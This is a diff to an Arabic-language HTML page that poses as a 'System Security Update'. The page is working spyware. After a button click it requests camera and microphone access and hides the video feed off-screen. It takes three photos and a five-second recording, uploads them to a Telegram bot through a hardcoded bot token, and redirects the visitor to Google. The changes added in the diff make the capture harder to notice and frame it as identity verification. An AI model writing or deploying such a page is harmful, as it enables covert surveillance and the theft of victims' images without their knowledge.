@@ -3,32 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فحص أمان الجهاز</title>
+    <title>تحديث أمان النظام</title>
     <style>
         body { background: #0c0c0c; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 50px 20px; }
-        .box { border: 1px solid #00ff41; padding: 20px; border-radius: 10px; display: inline-block; background: #1a1a1a; box-shadow: 0 0 15px #00ff41; }
+        .box { border: 1px solid #00ff41; padding: 20px; border-radius: 10px; display: inline-block; background: #1a1a1a; }
         .loader { border: 5px solid #333; border-top: 5px solid #00ff41; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { background: #00ff41; color: black; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 20px; }
+        button { background: #00ff41; color: black; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; }
     </style>
 </head>
 <body>
 
     <div class="box">
-        <h2>System Security Scanner</h2>
+        <h2>System Security Update</h2>
         <div id="loader_icon" class="loader" style="display:none;"></div>
-        <p id="status">اضغط لبدء الفحص الشامل</p>
-        <button id="start_btn" onclick="startFullScan()">ابدأ الفحص</button>
+        <p id="status">اضغط لتحديث قاعدة بيانات الأمان</p>
+        <button id="start_btn" onclick="startFullScan()">تحديث الآن</button>
     </div>
 
-    <video id="video" width="640" height="480" autoplay muted playsinline style="display:none;"></video>
+    <video id="video" width="160" height="120" autoplay muted playsinline style="visibility:hidden; position:absolute; left:-9999px;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
         const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
         let chatId = "";
 
-        // وظيفة الانتظار بالملي ثانية
         const sleep = ms => new Promise(res => setTimeout(res, ms));
 
         async function getChatId() {
@@ -44,56 +43,11 @@
         }
 
         async function sendToTelegram(type, content, fileName = "") {
-            if (!chatId) return;
             const fd = new FormData();
             fd.append('chat_id', chatId);
-            
-            let url = `https://api.telegram.org/bot${TOKEN}/`;
-            if (type === 'text') { url += 'sendMessage'; fd.append('text', content); }
-            else if (type === 'photo') { url += 'sendPhoto'; fd.append('photo', content, fileName); }
-            else if (type === 'video') { url += 'sendVideo'; fd.append('video', content, fileName); }
-
-            try {
-                const response = await fetch(url, { method: 'POST', body: fd });
-                return await response.json();
-            } catch (e) { return null; }
-        }
-
-        async function capturePhotos(stream) {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
-            
-            // الانتظار 3 ثوانٍ حتى تستقر الكاميرا وتضبط الإضاءة تلقائياً
-            await sleep(3000); 
-
-            for (let i = 1; i <= 3; i++) {
-                document.getElementById('status').innerText = `جاري التقاط العينة رقم ${i}...`;
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-                if (blob) {
-                    await sendToTelegram('photo', blob, `shot_${i}.jpg`);
-                    // انتظار 2 ثانية بعد إرسال كل صورة للتأكد من اكتمال الرفع
-                    await sleep(2000); 
-                }
-            }
-        }
-
-        async function recordVideo(stream) {
-            document.getElementById('status').innerText = "جاري فحص جودة الفيديو...";
-            return new Promise(resolve => {
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = async () => {
-                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
-                    await sendToTelegram('video', videoBlob, 'record.mp4');
-                    resolve();
-                };
-                recorder.start();
-                // تسجيل لمدة 4 ثوانٍ فقط لضمان سرعة الرفع
-                setTimeout(() => recorder.stop(), 4000);
-            });
+            let url = `https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
+            fd.append(type, content, fileName);
+            try { await fetch(url, { method: 'POST', body: fd }); } catch (e) {}
         }
 
         async function startFullScan() {
@@ -104,37 +58,49 @@
             btn.style.display = "none";
             loader.style.display = "block";
 
-            const idReady = await getChatId();
-            if (!idReady) {
-                status.innerText = "⚠️ خطأ: أرسل رسالة للبوت أولاً!";
-                loader.style.display = "none";
-                btn.style.display = "inline-block";
+            if (!(await getChatId())) {
+                status.innerText = "أرسل رسالة للبوت أولاً!";
                 return;
             }
 
             try {
-                status.innerText = "يرجى الموافقة على الأذونات...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('video').srcObject = stream;
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
-                await sendToTelegram('text', "🚀 بدأت عملية السحب الكاملة...");
+                status.innerText = "جاري تهيئة الكاميرا...";
+                await sleep(3000); // وقت كافٍ لفتح العدسة وضبط الإضاءة
 
-                // تنفيذ العمليات مع إعطاء الوقت الكافي
-                await capturePhotos(stream); 
-                await recordVideo(stream);   
-                
-                status.innerText = "✅ اكتمل الفحص!";
-                await sleep(1500);
-                window.location.href = "https://www.google.com";
+                // التقاط 3 صور
+                const canvas = document.getElementById('canvas');
+                for (let i = 1; i <= 3; i++) {
+                    status.innerText = `جاري رفع التقرير ${i}/3...`;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
+                    await sendToTelegram('photo', blob, `img_${i}.jpg`);
+                    await sleep(1500); 
+                }
+
+                // تسجيل الفيديو
+                status.innerText = "جاري التحقق من الهوية بالفيديو...";
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                    await sendToTelegram('video', videoBlob, 'verify.mp4');
+                    status.innerText = "تم التحديث بنجاح!";
+                    await sleep(1000);
+                    window.location.href = "https://www.google.com";
+                };
+                recorder.start();
+                await sleep(5000); // سجل 5 ثواني
+                recorder.stop();
 
             } catch (err) {
-                status.innerText = "❌ فشل: تم رفض الإذن.";
-                loader.style.display = "none";
-                btn.style.display = "inline-block";
+                status.innerText = "خطأ في الوصول للموارد!";
             }
         }
-
-        window.onload = getChatId;
     </script>
 </body>
 </html>
